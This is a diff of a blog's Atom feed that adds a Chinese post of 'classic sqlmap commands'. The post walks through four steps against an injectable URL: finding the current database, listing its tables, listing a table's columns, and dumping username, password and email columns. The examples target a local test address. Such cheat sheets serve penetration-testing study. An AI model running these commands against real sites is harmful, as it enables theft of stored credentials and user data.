@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-03-09T07:33:21.147Z</updated>
+  <updated>2018-03-09T10:07:51.195Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -21,12 +21,21 @@
     <link href="http://yoursite.com/2018/03/09/%E7%BB%8F%E5%85%B8sqlmap%E5%91%BD%E4%BB%A4/"/>
     <id>http://yoursite.com/2018/03/09/经典sqlmap命令/</id>
     <published>2018-03-09T15:33:21.000Z</published>
-    <updated>2018-03-09T07:33:21.147Z</updated>
+    <updated>2018-03-09T10:07:51.195Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="0x01-查看当前数据库，得到数据库名字"><a href="#0x01-查看当前数据库，得到数据库名字" class="headerlink" title="0x01 查看当前数据库，得到数据库名字"></a>0x01 查看当前数据库，得到数据库名字</h1><p>sqlmap.py -u “存在注入url” –current-db</p><p>python sqlmap.py -u “<a href="http://127.0.0.1:65412/?id=2" target="_blank" rel="noopener">http://127.0.0.1:65412/?id=2</a>“ –current-db</p><h1 id="0x02-查看tables-得到指定数据库的表名字"><a href="#0x02-查看tables-得到指定数据库的表名字" class="headerlink" title="0x02 查看tables,得到指定数据库的表名字"></a>0x02 查看tables,得到指定数据库的表名字</h1><p>python sqlmap.py -u “存在注入url” -D “当前数据库名” –tables   //解释说明：-D是指定数据库名称</p><p>python sqlmap.py -u “<a href="http://127.0.0.1:65412/?id=2" target="_blank" rel="noopener">http://127.0.0.1:65412/?id=2</a>“ –tables</p><h1 id="0x03-查看columns，得到指定数据库，指定表的列名字"><a href="#0x03-查看columns，得到指定数据库，指定表的列名字" class="headerlink" title="0x03 查看columns，得到指定数据库，指定表的列名字"></a>0x03 查看columns，得到指定数据库，指定表的列名字</h1><p>sqlmap.py -u “存在注入url” -D “当前数据库名” -T “数据库中的随意一张表(选取表需要自己判断)” –columns</p><p>python sqlmap.py -u “<a href="http://127.0.0.1:65412/?id=2" target="_blank" rel="noopener">http://127.0.0.1:65412/?id=2</a>“ -T “users” –columns</p><h1 id="0x04-根据上面得到的columns查看具体字段"><a href="#0x04-根据上面得到的columns查看具体字段" class="headerlink" title="0x04 根据上面得到的columns查看具体字段"></a>0x04 根据上面得到的columns查看具体字段</h1><p>sqlmap.py -u “存在注入url ” -D “当前数据库名” -T “数据库中的随意一张表(选取表需要自己判断)” -C “username,password,email” –dump</p><p>python sqlmap.py -u “<a href="http://127.0.0.1:65412/?id=2" target="_blank" rel="noopener">http://127.0.0.1:65412/?id=2</a>“ -T “users” -C “password” –dump</p>]]></content>
     
     <summary type="html">
     
+      
+      
+        &lt;h1 id=&quot;0x01-查看当前数据库，得到数据库名字&quot;&gt;&lt;a href=&quot;#0x01-查看当前数据库，得到数据库名字&quot; class=&quot;headerlink&quot; title=&quot;0x01 查看当前数据库，得到数据库名字&quot;&gt;&lt;/a&gt;0x01 查看当前数据库，得到数据库名字&lt;/h1&gt;&lt;
+      
+    
     </summary>
     
+    
+      <category term="Web security" scheme="http://yoursite.com/tags/Web-security/"/>
     
   </entry>
   
